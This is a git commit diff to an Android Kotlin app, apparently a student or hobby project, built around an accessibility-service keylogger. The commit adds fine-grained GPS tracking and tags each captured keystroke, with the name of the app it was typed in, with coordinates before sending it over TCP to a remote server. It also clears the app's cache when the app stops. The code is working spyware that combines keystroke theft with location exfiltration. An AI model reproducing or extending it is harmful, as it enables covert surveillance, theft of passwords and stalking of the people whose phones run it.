63b713349c7c5228fc9289bfc4a41f61ee81bf31
Lorenzo <alejandro36036@gmail.com>
2025-02-16 20:45:35 -0400

    feature: geocalizacion
    geocalizacion

--- socket/app/src/main/java/com/example/socket/MainActivity.kt
+++ socket/app/src/main/java/com/example/socket/MainActivity.kt
@@ -1,39 +1,38 @@
 package com.example.socket
 
 import MyServerSocket
+import android.Manifest
 import android.content.Intent
-import androidx.appcompat.app.AppCompatActivity
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import android.widget.Button
 import android.widget.EditText
 import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
-
-//Guia de uso
-//Activar en accesibility los permisos de accesibilidad de la aplicacion
-// El telefono servidor no puede cerrarse se coloca su ip respectivo en el input IP
-// El telefono cliente se conecta al ip del telefono servidor colocandolo en el input IP
-// El telefono cliente puede trabajar en segundo plano y trabajar
-// Para ver los mensajes metete en el logcat y busca el filtro package:mine
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import java.io.File
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var textView: TextView
     private val handler = Handler(Looper.getMainLooper()) { message ->
-        // Agregar la nueva línea al TextView
         val data = message.obj as String
         appendToTextView(data)
         true
     }
 
+    private val LOCATION_PERMISSION_REQUEST_CODE = 1001
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Inicializar textView
         textView = findViewById(R.id.textAreaKeylloger)
 
         val inputMessage: EditText = findViewById(R.id.inputPort)
@@ -46,10 +45,28 @@ class MainActivity : AppCompatActivity() {
             }.start()
             val ip = inputIp.text.toString()
             if (ip.isEmpty()) {
-                Toast.makeText(this, "Por favor, ingresa una ip", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Por favor, ingresa una IP", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            startKeyloggerService(ip)
+
+            // Verificar y solicitar permisos de ubicación
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), LOCATION_PERMISSION_REQUEST_CODE)
+            } else {
+                startKeyloggerService(ip)
+            }
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
+            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                val ip = findViewById<EditText>(R.id.inputIp).text.toString()
+                startKeyloggerService(ip)
+            } else {
+                Toast.makeText(this, "Permiso de ubicación denegado", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
@@ -60,16 +77,37 @@ class MainActivity : AppCompatActivity() {
         Toast.makeText(this, "Servicio de keylogger iniciado", Toast.LENGTH_SHORT).show()
     }
 
-    // Función para agregar texto al TextView y hacer scroll automático
     private fun appendToTextView(text: String) {
         runOnUiThread {
-            textView.append("$text\n") // Agrega la nueva línea al final
-            // Desplaza el ScrollView hacia abajo para mostrar el último contenido
+            textView.append("$text\n")
             val scrollView = textView.parent as ScrollView
             scrollView.post {
                 scrollView.fullScroll(ScrollView.FOCUS_DOWN)
             }
         }
     }
-}
 
+    override fun onStop() {
+        super.onStop()
+        deleteCache()
+    }
+
+    private fun deleteCache() {
+        try {
+            val cacheDir = cacheDir
+            if (cacheDir != null && cacheDir.exists()) {
+                Log.d("MainActivity", "Borrando caché en: ${cacheDir.absolutePath}")
+                val deleted = cacheDir.deleteRecursively()
+                if (deleted) {
+                    Log.d("MainActivity", "Caché borrada correctamente")
+                } else {
+                    Log.e("MainActivity", "No se pudo borrar la caché")
+                }
+            } else {
+                Log.e("MainActivity", "El directorio de caché no existe")
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error al borrar la caché: ${e.message}")
+        }
+    }
+}
--- socket/app/src/main/java/com/example/socket/keyloggerService.kt
+++ socket/app/src/main/java/com/example/socket/keyloggerService.kt
@@ -2,19 +2,86 @@ package com.example.socket
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.Manifest
+import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationCallback
+import com.google.android.gms.location.LocationRequest
+import com.google.android.gms.location.LocationResult
+import com.google.android.gms.location.LocationServices
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import java.io.OutputStreamWriter
 import java.net.Socket
 
+
 class keyloggerService : AccessibilityService() {
     private var serverIp: String? = null
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
+    private lateinit var locationRequest: LocationRequest
+    private lateinit var locationCallback: LocationCallback
+    private var lastLocation: String? = null // Almacenar la última ubicación conocida
+
+
+    override fun onCreate() {
+        super.onCreate()
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        createLocationRequest()
+        createLocationCallback()
+    }
+
+    private fun createLocationRequest() {
+        locationRequest = LocationRequest.create().apply {
+            interval = 10000 // Intervalo de actualización: 10 segundos
+            fastestInterval = 5000 // Intervalo más rápido: 5 segundos
+            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
+        }
+    }
+
+    private fun createLocationCallback() {
+        locationCallback = object : LocationCallback() {
+            override fun onLocationResult(locationResult: LocationResult) {
+                for (location in locationResult.locations) {
+                    val latitude = location.latitude
+                    val longitude = location.longitude
+                    lastLocation = "La $latitude, Lo: $longitude" // Actualizar la última ubicación
+                    Log.d("LocationUpdate", "Last location updated: $lastLocation")
+                }
+            }
+        }
+    }
+
+    private fun startLocationUpdates() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
+            } else {
+                Log.e("LocationUpdate", "Permiso de ubicación no concedido")
+            }
+        } else {
+            // Para versiones anteriores a Marshmallow, no es necesario solicitar permisos en tiempo de ejecución
+            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
+        }
+    }
+
+    private fun stopLocationUpdates() {
+        fusedLocationClient.removeLocationUpdates(locationCallback)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        stopLocationUpdates()
+    }
+
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         serverIp = intent?.getStringExtra("SERVER_IP")  // Recibir la IP del Intent
+        startLocationUpdates()
         return super.onStartCommand(intent, flags, startId)
     }
 
@@ -36,7 +103,7 @@ class keyloggerService : AccessibilityService() {
                 // Send the keystrokes to the TCP server
                 sendToUI(logMessage)
                 CoroutineScope(Dispatchers.IO).launch {
-                    sendToServer("Package name [$packageName] Keystroke [$typedText]")
+                    sendToServer("Location [$lastLocation], $packageName:$typedText")
                 }
             }
         }
